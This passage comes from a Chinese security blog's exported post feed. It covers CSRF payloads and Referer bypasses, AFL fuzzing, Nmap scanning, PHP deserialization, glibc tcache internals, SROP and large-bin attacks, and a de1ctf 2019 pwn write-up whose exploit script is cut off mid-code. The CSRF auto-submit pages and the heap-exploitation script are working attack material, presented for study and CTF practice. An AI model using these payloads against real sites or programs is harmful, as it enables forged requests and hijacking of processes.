    <content type="text"><![CDATA[概览CSRF攻击的本质是攻击者能知道某个操作的所有参数,通过构造url让受害者访问从而伪造请求. 使用CSRF常使用标签的src跳转,如:&lt;img&gt;,&lt;script&gt;,&lt;iframe&gt;. 或者使用JS方法等等. 1234&lt;script&gt; var foo = new Image(); foo.src = url.&lt;/script&gt; 针对GET和POST有不同类型的payload. GET. 1&lt;img src='http://www.bug.com/get.php?do=20'&gt; POST. 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;index&lt;/title&gt; &lt;script type="text/javascript"&gt; function csrf() &#123; window.frames['aaa'].document.forms[0].submit(); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body onload="csrf()"&gt; &lt;iframe name="aaa" display="none" src="./csrf.html"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; csrf.html. 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;csrf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form display="none" action="http://www.bug.com/post.php" method="post" &gt; &lt;input type="hidden" name="do" value="20"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; JSON HijackingJSON是JavaScript的子集,一种轻量化的数据交换格式,实际上就是键值对. JSON Hijacking实际上就是利用CSRF漏洞盗取用户在漏洞网站的铭感信息. 绕过RefererCSRF绕过Referer的情况,需要看后端对Referer的限制. 使Referer为空利用data协议使Referer为空. 12345&lt;html&gt; &lt;body&gt; &lt;iframe src="data:text/html;base64,aHR0cHM6Ly9idWcuY29tL2F0dGFjay5waHA="&gt; &lt;/body&gt; &lt;/html&gt; 在通过跨协议调用js时,发送的http请求里Referer为空. 1&lt;iframe src="https://bug.com/attack.php"&gt; 判断Referer是某域利用二级域名. 判断Referer是否存在关键字在网站新建一个关键字目录,把CSRF存放在该目录即可. 判断referer是否含有某域名例如126.com.可以构造子域名x.126.com.xxx.com作为载体服务器.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞挖掘-fuzz-AFL使用]]></title>
    <url>%2Fposts%2Fdd76f0e2%2F</url>
    <content type="text"><![CDATA[概览 首先使用afl-gcc编译项目代码. 将初始testcase放到in目录下. 执行afl-fuzz -i in -o out &lt;program&gt; @@,path为可执行程序路径,@@表示初始用例从文件中读入. 通过out目录(fuzzing结果)分析. 可参考README.txt. 初始测试用例选择AFL可以有一个或多个包含测试数据的初始文件(testcase). 初始文件大小最好低于1kB. 每个测试用例应该能驱动程序中的不同功能. 常见错误第一次启动往往会报错,表示某些环境变量没有配置或者配置错误. 没有打开错误转储机制,系统配置为将核心转储文件通知发送到外部程序.将导致将崩溃信息发送到Fuzzer之间的延迟增大,进而可能将崩溃被误报为超时. 12sudo suecho core &gt;/proc/sys/kernel/core_pattern 对代码进行插桩在使用AFL编译工具afl-gcc对源码进行编译时,程序会使用afl-as工具对编译并未汇编的c/c++代码(.i文件)进行编译插桩,生成汇编文件(.s文件). 1afl-gcc -g -o test test.c 对于项目,重新编译目标程序的配置可能会因不同程序而不同. 12make CC="afl-gcc" CXX="afl-g++"#make CC="afl-clang" CXX="afl-clang++" 当测试lib库的时候,需要从stdin或者从文件读取数据,传入到被测试的lib库中. 可以把被插桩的lib库以静态的方式连接到可执行文件或者确保正确的.so文件在程序运行时加载(通过LD_LIBRARY_PATH). 通常采用静态编译. 1make --disable-shared CC="afl-gcc" CXX="afl-g++" 对没有源代码的程序进行测试要用到AFL的QEMU模式. 因为AFL使用的QEMU版本太旧,util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突. 1234sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-devcd qemu_modebuild_qemu_support.shcd .. &amp;&amp; make install 此时就可以添加-Q选项使用QEMU模式进行Fuzzing. fuzzing对直接从stdin中接收输入的目标二进制程序. 1./afl-fuzz -i in -o out &lt;program&gt; [params] 如果从文件中读取输入,则在指令最后使用@@标记,在实际执行的时候afl-fuzz会把@@替换成测试样本目录in下的测试样本. -i:指定输入文件夹. -o:指定输出文件夹. -f &lt;filename&gt;:将变异过的数据写入指定的文件. -Q:进入QEMU模式fuzz. -t &lt;timeout&gt;:设置timeout. -m &lt;memory limit&gt;:设置memory limit. -d:使用zzuf和其他传统的模糊测试工具短时间获得较脏的结果. 其中params为被测试程序接受的命令行参数. fuzzing流程. 读取初始in/testcase,将其放入queue中. 从queue中读取内容作为程序输入. 尝试在不影响流程的情况下精简测试用例. 使用算法对输入进行突变. 如果突变后的输入能够有新的状态转移,将其放入queue中. 回到2. 输出解释从status_screen.txt中可以找到显式界面中各字段的含义,以及监控被测试程序的健康状态. fuzzing进程会一直持续直到按下Ctrl-C. 在输出目录中有三个子目录. queue:每一条不同的执行路径对应的测试用例,包括所有由用户提供的初始化测试用例文件. crashes:能导致被测试程序获得致命信号(如SIGSEGV,SIGILL,SIGABRT等)的唯一性的测试用例.crashes/README.txt保存了目标执行这些crash文件的命令行参数. hangs:能导致被测试程序超时的唯一性测试用例.执行时间限制超过默认的1s或者以-t参数设置的数值之后,当前测试用例就会被记录在这个文件夹下. crashes和hangs的文件名与父节点以及没出错的队列节点相关. 其中还有fuzzer_stats文件记录了afl-fuzz的运行状态,plot_data文件用于afl-plot绘图. 恢复任何已经存在的output目录对应的工作能被重新恢复. 1./afl-fuzz -i- -o out &lt;program&gt; 触发crash使程序crash的输入保存在out/crashes目录下. 12xxd out/crashes/id\:000000\,sig\:06\,src\:000000\,op\:havoc\,rep\:16#查看文件的二进制内容 将crash文件用作输入可以使程序崩溃产生core文件,然后gdb core path调试即可. 1./test out/crashes/id\:000000\,sig\:06\,src\:000000\,op\:havoc\,rep\:16 当不能使用afl-fuzz重现crash的时候,最有可能的原因是没有设置相同的内存限制.尝试以下命令. 1LIMIT_MB=50 在以上命令中,更改LIMIT_MB参数与-m参数相匹配. 结束测试状态窗口中cycles done字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考,随着周期数不断增大,其颜色也会由洋红色,逐步变为黄色,蓝色,绿色. 当其变为绿色时,继续Fuzzing下去也很难有新的发现.或者一旦path covera达到99%就可以中止fuzz. 辅助工具afl提供了辅助工具帮助更好的进行fuzzing. 语料库蒸馏语料库层面的最小化就比如之前的favored集合,afl-cmin中的思路类似但更复杂且会将冗余的测试用例删除,找到与语料库全集具有相同覆盖范围的最小子集. 1afl-cmin -i in -o new_in -- &lt;program&gt; [params] 测试用例层面的最小化,其目的是尽可能的移除测试用例中的数据,同时保持目标程序的执行状态不变,对于不产生crash的测试用例可基于前面讨论的插桩技术来判断这些简化操作对目标程序的执行路径是否有影响,afl-tmin.c中所用到的简化操作分为块清零,块移除和字符清零.afl-tmin使用ASCII数字0而不是0x00对块进行归零处理. afl-tmin有两种工作模式,instrumented mode和crash mode.默认的工作方式是instrumented mode. 1afl-tmin -i in -o new_in -- &lt;program&gt; @@ 指定参数-x,即crash mode,会把导致程序非正常退出的文件直接剔除. 1afl-tmin -x -i in -o new_in -- &lt;program&gt; @@ 并行fuzzingAFL支持并行fuzzing,由于每个afl-fuzz例程只占用CPU中的单核,可以同时运行多个fuzzing. 可通过afl-gotcpu工具来获取CPU的使用情况,进而决定增加或减少afl-fuzz例程. 可通过afl-whatsup工具统计各并行例程的结果. 查看机器的核心数. 1cat /proc/cpuinfo | grep "cpu cores" | uniq afl-fuzz并行Fuzzing,一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer),通过-S参数指定多个从Fuzzer(Slave Fuzzer). 123afl-fuzz -i in -o out -M fuzzer1 -- &lt;program&gt;afl-fuzz -i in -o out -S fuzzer2 -- &lt;program&gt;afl-fuzz -i in -o out -S fuzzer3 -- &lt;program&gt; fuzz网络程序afl默认只能fuzz通过stdin和文件获取输入的程序,要fuzz网络相关的程序,需要使用其他库辅助. 这里推荐使用:https://github.com/zardus/preeny.其利用LD_PRELOAD机制,重写了很多库函数,desock.c文件重写了socket相关的函数,其实现的功能就是当应用从socket获取输入时,其实是从stdin获取输入.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-tool-Nmap]]></title>
    <url>%2Fposts%2F671415cd%2F</url>
    <content type="text"><![CDATA[概览Nmap基本功能:主机发现,端口扫描和服务嗅探,操作系统侦测. nmap端口状态Open:应用程序在该端口接收TCP连接或者UDP报文.Closed:关闭的端口对于nmap也是可访问的,它接收nmap探测报文并作出响应.但没有应用程序在其上监听.Filtered:由于包过滤阻止探测报文到达端口,nmap无法确定该端口是否开放.过滤可能来自专业的防火墙设备,路由规则或者主机上的软件防火墙.Unfiltered:未被过滤状态意味着端口可访问,但是nmap无法确定它是开放还是关闭.只有用于映射防火墙规则集的ACK扫描才会把端口分类到这个状态. 特殊状态. open|filtered:无法确定端口是开放还是被过滤,开放的端口不响应就是一个例子.没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应.可以换扫描方式继续,closed|filtered:无法确定端口是关闭的还是被过滤的.只会出现在IPID Idle扫描中. 原理Nmap使用TCP/IP协议栈指纹准确地判断目标主机的操作系统类型. 应用层协议:STMP,FTP,DNS,SNMP,NFS,HTTP,TELNET. 传输层协议:TCP,UDP. 网络层协议:ICMP,IGMP,IP,ARP,RARP. 网络接口层协议:LAN,MAN,WAN. Nmap对目标主机进行一系列的测试,利用测试结果建立相应目标主机的Nmap指纹,然后Nmap会对指纹进行匹配,最终输出相应的结果. 参数与使用指定目标. xx.xx.xx.a-b:扫描一个C段,或者xx.xx.xx.a/24(或者使用空格隔开),还可以使用--exclude ip [ip2 ...]排除ip. -iL &lt;file&gt;:扫描文件中所有ip. -iR count:随机选取count个ip进行扫描. 常用参数. -A:全面扫描指定IP或域名的所有端口及其目标系统信息等. -sn:Ping Scan只进行主机发现,不进行端口扫描. -sP:ping扫描.默认情况发送一个ICMP回声请求和一个TCP报文到目标端口. -P0:无ping扫描.可以躲避某些防火墙的防护. -Pn:即使没收到ping应答仍进行扫描. -PS/PA/PU/PY[portlist]:使用TCP SYN Ping/TCP ACK Ping/UDP Ping/SCTP INIT Ping扫描. -PE/PP/PM:ICMP Ping Types扫描. -PR:ARP Ping扫描. -n:禁止DNS反向解析. -R:反向解析域名. --system-dns:使用系统域名解析器. -sL:列表扫描. -6:扫描IPv6地址. --traceroute:路由追踪. --packet-trace:网络包追踪. -T[n]:时序选项.n = 0-5,0和1非常慢,常用于IDS逃避.3为默认,4为快速扫描. -p:指定端口范围,-p1-65535 == -p-.默认不扫描所有端口,不加-p时,显示的都是已知协议的端口,对于未知协议的端口没显示. -F:快速扫描有限的端口(具体范围为nmap-services文件定义). --scanflags:自定义TCP扫描.通过数字标记值或者字符名来设置报文标志位. -sS:TCP同步扫描(TCP SYN).也称为半开扫描.相对较隐蔽且能区分出端口的开放状态. -sT:TCP connect()扫描,容易被检测. -sU:UDP端口扫描.能区分出端口的开放状态但扫描非常慢. -sR:RPC扫描.此方法可以和nmap的其它不同的端口扫描方法结合使用.选择所有处于打开状态的端口向它们发出SunRPC程序的NULL命令,以确定它们是否是RPC端口. -sN:空(Null)扫描模式. -sF:秘密FIN数据包扫描.使用暴露的FIN数据包来探测. -sX:Xmas扫描.打开数据包的FIN,URG和PUSH标志.如果端口开放则会响应RST标志包. -sA:ACK扫描.向特定的端口发送ACK包(使用随机的应答/序列号).如果返回一个RST包,就标记为unfiltered.如果没有返回或者返回一个不可达ICMP消息,就归入filtered. -sW:对滑动窗口的扫描.通过检测返回的RST报文的TCP窗口域判断目标端口是否开放.为0表示未开放. -sM:TCP Maimon扫描.与-sX/F/N类似. -sI &lt;host:port&gt;:空闲扫描.一种端口完全欺骗扫描,利用不活跃的僵尸主机反弹一个旁通信道进行端口扫描. -sO:IP协议扫描.用于扫描目标主机开放IP协议类型. -sV:版本检测. --allports:全端口版本检测. --version-intensity:0~9,设置版本检测的强度.越大成功率越高.--version-light == --version-intensity 2.--version-all == --version-intensity 9. --version-trace:获取详细版本信息. -sC:脚本扫描. -b:FTP Bounce扫描. -O:OS检测. --osscan-limit:只对具有打开和关闭的端口的主机进行操作系统检测.配合-O或-A. -v:显示冗余(verbosity)信息. -oX:生成xml形式的扫描报告. 控制参数. --min-hostgroup/max:调整并行扫描组的最小值/最大值.--min-parallelism/max:调整探测报文的最小/最大并行度.--min-rrt-timeout/max/initial 100ms:单位为ms,调整探测报文超时.--host-timeout:调整一个主机的超时阈值,从而放弃缓慢主机.--scan-delay/--max-scan-delay:调整探测报文的时间间隔. Nmap NSE脚本123456cd /usr/share/nmap/scripts/git clone https://github.com/vulnersCom/nmap-vulners.gitgit clone https://github.com/scipag/vulscan.gitcd vulscan/utilities/updater/chmod +x updateFiles.sh./updateFiles.sh 使用Nmap-Vulners进行扫描. 1nmap --script nmap-vulners -sV &lt;IP&gt; 使用Vulscan进行扫描. 1234nmap --script vulscan -sV &lt;IP&gt;nmap --script vulscan --script-args vulscandb=database_name -sV &lt;IP&gt;# 指定漏洞库 例子. 1nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV &lt;IP&gt; Nmap还有自带的脚本. auth:负责处理鉴权证书(绕开鉴权). broadcast:在局域网内探查更多服务开启状况,如dhcp/dns/sqlserver等服务. brute:提供暴力破解方式,针对常见的应用如http/snmp等. default:使用-sC或-A选项扫描时候默认的脚本,提供基本脚本扫描能力. discovery:对网络进行更多的信息,如SMB枚举,SNMP查询等. dos:用于进行拒绝服务攻击. exploit:利用已知的漏洞入侵系统. external:利用第三方的数据库或资源,例如进行whois解析. fuzzer:模糊测试的脚本,发送异常的包到目标机,探测出潜在漏洞. intrusive:入侵性的脚本,此类脚本可能引发对方的IDS/IPS的记录或屏蔽. malware:探测目标机是否感染了病毒,开启了后门等信息. safe:此类与intrusive相反,属于安全性脚本. version:负责增强服务与版本扫描(Version Detection)功能的脚本. vuln:负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-PHP-反序列化漏洞]]></title>
    <url>%2Fposts%2Fd31a99ec%2F</url>
    <content type="text"><![CDATA[概览PHP反序列化漏洞又称对象注入,可能会导致远程代码执行(RCE).漏洞为执行unserialize函数,调用某一类并执行魔术方法(magic method),之后可以执行类中函数,产生安全问题. 漏洞的前提:unserialize函数的参数可控;PHP文件中存在可利用的类,类中有魔术方法; unserializeunserialize.unserialize以一个被序列化的变量(即字符串)为参数,将其转换回序列化之前的值. 12345678910111213&lt;?php class User &#123; public $age = 0; public $name = ''; public function PrintData() &#123; echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;'; &#125; &#125; $usr = unserialize('O:4:"User":2:&#123;s:3:"age";i:20;s:4:"name";s:4:"John";&#125;'); $usr-&gt;PrintData();?&gt;//User John is 20 years old 通常通过本地生成一个对象并序列化(serialize)获得序列化后的字符串,可能存在不可见字符,通过urlencode函数转化. Magic functionPHP中有一类特殊的方法叫Magic function,下面是unserialize时可利用的Magic function. __destruct():当对象被销毁时会自动调用.__wakeup():unserialize()时会自动调用.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-源码分析-Linux-ptmalloc-tcache]]></title>
    <url>%2Fposts%2Feeeed367%2F</url>
    <content type="text"><![CDATA[前言基于glibc-2.27. 对应结构体tcache_entry.类似于fastbin,tcache也是以单向链表连接. 12345/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry &#123; struct tcache_entry *next;&#125; tcache_entry; tcache_perthread_struct.每个线程使用一个tcache_perthread_struct管理当前线程的tcache. 123456typedef struct tcache_perthread_struct &#123; char counts[TCACHE_MAX_BINS]; //记录对应单向链表保存的tcache的数量,默认最大值为7 tcache_entry *entries[TCACHE_MAX_BINS]; //对应的单向链表&#125; tcache_perthread_struct; 与fastbin不同的是tcache的next指向user data的地方,即chunk header之后. tcache的分配与释放概览free内存时,如果size小于small bin size时,chunk会先放到对应的tcache中,直到tcache被填满.tcache中的chunk不会合并(不取消inuse bit). malloc内存时,如果size在tcache范围内,先从tcache取chunk,直到tcache为空后从bin中找. tcache为空时,如果fastbin/smallbin/unsorted bin中有size符合的chunk,会先把fastbin/smallbin/unsorted bin中的chunk放到tcache中,直到填满.之后再从tcache中取. source code主要分析malloc与free在tcache机制后的改变. __libc_malloc__libc_malloc. 1234567891011121314151617void * __libc_malloc (size_t bytes)&#123; /* code */#if USE_TCACHE size_t tbytes; checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif /* code */&#125; MAYBE_INIT_TCACHE. 123# define MAYBE_INIT_TCACHE() \ if (__glibc_unlikely (tcache == NULL)) \ tcache_init(); tcache_init. 1234567891011121314151617181920212223static void tcache_init(void) &#123; mstate ar_ptr; void *victim = 0; const size_t bytes = sizeof (tcache_perthread_struct); if (tcache_shutting_down) return; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim &amp;&amp; ar_ptr != NULL) &#123; ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); if (victim) &#123; tcache = (tcache_perthread_struct *) victim; memset (tcache, 0, sizeof (tcache_perthread_struct)); &#125;&#125; tcache_get(). 12345678static __always_inline void * tcache_get (size_t tc_idx)c&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; __libc_free__libc_free无太大变化. 123456void __libc_free (void *mem) &#123; /* code */ MAYBE_INIT_TCACHE (); ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0);&#125; _int_free. 12345678910111213static void _int_free (mstate av, mchunkptr p, int have_lock) &#123; /* code */#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif /* code */&#125; tcache_put. 1234567static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;]]></content>
      <categories>
        <category>binary</category>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-srop]]></title>
    <url>%2Fposts%2Fe80ff632%2F</url>
    <content type="text"><![CDATA[概览SROP(Sigreturn Oriented Programming),即利用Linux信号处理完成的rop攻击. Linux信号处理当内核向某个进程发起一个signal,该进程会被暂时挂起,进入内核,然后内核为该进程保存相应的上下文,跳转到之前注册好的signal handler中处理相应signal,当signal handler返回之后,内核为该进程恢复之前保存的上下文,最后恢复进程的执行. 如何使得用户态的signal handler执行完成之后能够顺利返回内核态是关键.在类UNIX的各种不同的系统中,这个过程有些许的区别,但是大致过程是一样的. 以Linux为例,在第二步的时候,内核会帮用户进程将其上下文(signal frame)保存在该进程的栈上,然后在栈顶填上一个地址rt_sigreturn,这个地址指向一段代码,在这段代码中会调用rt_sigreturn系统调用.因此,当signal handler执行完之后,最后一条ret指令会使得执行流跳转到这段rt_sigreturn代码,被动地进行rt_sigreturn系统调用. 在内核rt_sigreturn系统调用处理函数中,会根据当前的栈指针指向的Signal Frame对进程上下文进行恢复,并返回用户态,从挂起点恢复执行. 32位的signal frame实现. 12345678910111213141516171819202122232425struct sigcontext&#123; unsigned short gs, __gsh; unsigned short fs, __fsh; unsigned short es, __esh; unsigned short ds, __dsh; unsigned long edi; unsigned long esi; unsigned long ebp; unsigned long esp; unsigned long ebx; unsigned long edx; unsigned long ecx; unsigned long eax; unsigned long trapno; unsigned long err; unsigned long eip; unsigned short cs, __csh; unsigned long eflags; unsigned long esp_at_signal; unsigned short ss, __ssh; struct _fpstate * fpstate; unsigned long oldmask; unsigned long cr2;&#125;; 64位的signal frame实现. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152typedef struct ucontext&#123; unsigned long int uc_flags; struct ucontext *uc_link; __sigset_t uc_sigmask; stack_t uc_stack; mcontext_t uc_mcontext; long int uc_filler[5];&#125; ucontext_t;typedef struct sigaltstack&#123; __ptr_t ss_sp; size_t ss_size; int ss_flags;&#125; stack_t;struct sigcontext&#123; __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union &#123; struct _fpstate * fpstate; __uint64_t __fpstate_word; &#125;; __uint64_t __reserved1 [8];&#125;; 利用假设攻击者可以控制用户进程的栈,那么就可以伪造一个Signal Frame. 一旦rt_sigreturn执行,就会去执行execve系统调用. 攻击者除了可以控制用户进程的栈,还需要知道syscall指令和rt_sigreturn系统调用在内存中的地址.在不同的类UNIX系统中,这些系统调用会出现在不同的位置. 或者通过syscall调用rt_sigreturn. x86环境下vDSO只有一字节是random,也就是1/256的命中率,范围为0xf7700000 ~ 0xf7800000. pwnlib.rop.sroppwntools集成了SROP的利用工具,直接使用类SigreturnFrame构造Signal Frame. 类SigreturnFrame的结构和初始化的值因为系统与程序的不同会有所不同.i386 on i386,i386 on amd64,amd64 on amd64. 123456789context.arch = 'i386'SigreturnFrame(kernel = 'i386')#i386 on i386context.arch = 'i386'SigreturnFrame(kernel = 'amd64')#i386 on amd64context.arch = 'amd64'SigreturnFrame(kernel = 'amd64')#amd64 on amd64 利用SROP构造系统调用串只需要再额外添加一个对栈指针rsp的控制即可.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-large_bin_attack]]></title>
    <url>%2Fposts%2F9ba3e5cb%2F</url>
    <content type="text"><![CDATA[漏洞要素写一个free后的large chunk,可用于修改两个任意地址的值为libc的一个地址 利用思路首先分配chunk p1,p2和p3(2,3一样大),并且在它们之间插入其他的chunk以防止在释放时被合并. 依次释放掉p1和p2,这两个chunk将被放入unsorted bin. 接下来随便malloc一个chunk使p1被切分为两块(小于p1即可),同时p2回到对应的large bin链表中. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051if (in_smallbin_range (size)) &#123; /* code */&#125; else &#123; /* 当前chunk属于large bins同理插入,不过large bin中的空闲chunk是按照从大到小排序的,需要找对插入位置 */ victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; if (fwd != bck) &#123; /* fwd不等于bck意味着该large bin中有空闲chunk存在 */ size |= PREV_INUSE; /* 将当前chunk的size的inuse标志bit置位,相当于加1,便于加快chunk大小的比较 */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); /* 断言在large bin双向循环链表中的最后一个chunk的size字段中的非主分配区的标志bit没有置位 */ if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; /* 当前chunk比large bin的最后一个chunk的大小还小,那么当前chunk就插入到large bin的链表的最后. */ /* 存在两个双向循环链表,一个包含了large bin中所有的chunk,另一个为chunk size链表,该链表从每个相同大小的chunk的取出第一个chunk按照大小顺序链接在一起 */ fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) &#123; /* 正向遍历chunk size链表,直到找到第一个大小小于等于当前chunk大小的chunk */ fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* 则同一大小的chunk已经存在,为了不修改chunk size链表,当前chunk插入fwd之后 */ fwd = fwd-&gt;fd; else &#123; /* 当前chunk的大小大于fwd的大小,则将当前chunk作为该chunk size的代表加入chunk size链表,chunk size链表也是按照由大到小的顺序排序 */ victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else /* 如果large bin链表中没有chunk,直接将当前chunk加入chunk size链表 */ victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;/* 上面的代码将当前chunk插入到large bin的空闲chunk链表中,并将large bin所对应binmap的相应bit置位 */ 这时对large bin里的chunk p2进行修改. 12345gef&gt; x/8gx p2-20x555555757130: 0x0000000000000000 0x00000000000003f1 &lt;-- fake_size:小于原大小0x555555757140: 0x0000000000000000 0x00007fffffffde60 &lt;-- fake_bk:0x555555757150: 0x0000000000000000 0x00007fffffffde58 &lt;-- fake_bk_nextsize0x555555757160: 0x0000000000000000 0x0000000000000000 最后释放p3,将其放入unsorted bin,紧接着进行malloc之前p1切分剩下的chunk,将p3整理回large bin. 1234567891011121314151617181920212223242526272829303132victim_index = largebin_index (size);bck = bin_at (av, victim_index);fwd = bck-&gt;fd;if (fwd != bck) &#123; size |= PREV_INUSE; assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; /* code */ &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) &#123; /* code */ &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* code */ else &#123; //此时fwd = p2,victim = p3. victim-&gt;fd_nextsize = fwd; //p3-&gt;fd_nextsize = p2 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; //p3-&gt;bk_nextsize = p2-&gt;fake_bk_nextsize fwd-&gt;bk_nextsize = victim; //p2-&gt;bk_nextsize = p2 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //p2-&gt;fake_bk_nextsize-&gt;fd_nextsize = p3 &#125; bck = fwd-&gt;bk; //bck = p2-&gt;fake_bk &#125;&#125;//...mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; //p2-&gt;fake_bk-&gt;fd = p3 所以实际修改地址为:fake_bk_nextsize + 0x20,fake_bk + 0x10.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-de1ctf-2019-pwn]]></title>
    <url>%2Fposts%2Ff9ab6241%2F</url>
    <content type="text"><![CDATA[weapon首先double free配合fastbin attack造成堆溢出.修改chunk_size释放获得unsorted bin. 恢复chunk_size进行1/16几率的_IO_2_1_stdout_地址爆破,分配成功即爆破成功. 修改_IO_write_base指针泄露libc地址,再次double free修改malloc_hook为one_gadget获得shell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context(os = "linux", arch = "amd64")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#context.log_level = 'debug'def create(index, size, content): r.sendline('1') r.sendlineafter('size of weapon: ', str(size)) r.sendlineafter('input index: ', str(index)) r.sendafter('your name:\n', content) r.recvuntil('choice &gt;&gt; \n')def delete(index): r.sendline('2') r.sendlineafter('input idx :', str(index)) r.recvuntil('choice &gt;&gt; \n')def rename(index, content): r.sendline('3') r.sendlineafter('input idx: ', str(index)) r.sendafter('new content:\n', content) data = r.recvuntil('choice &gt;&gt; \n') return data#r = process('./pwn')r = remote("139.180.216.34", "8888")r.recvuntil('choice &gt;&gt; \n')create(0, 0x60, "a")create(1, 0x60, "a")create(2, 0x60, "a")create(9, 0x10, "a")delete(0)delete(1)delete(0)create(0, 0x60, p8(0x60))create(1, 0x60, "a")create(0, 0x60, p64(0) * 11 + p64(0x71))create(3, 0x60, p64(0) + p64(0xe1))delete(1)rename(3, p64(0) + p64(0x71))delete(0)delete(2)delete(0)create(0, 0x60, p8(0x70))create(2, 0x60, "a")create(0, 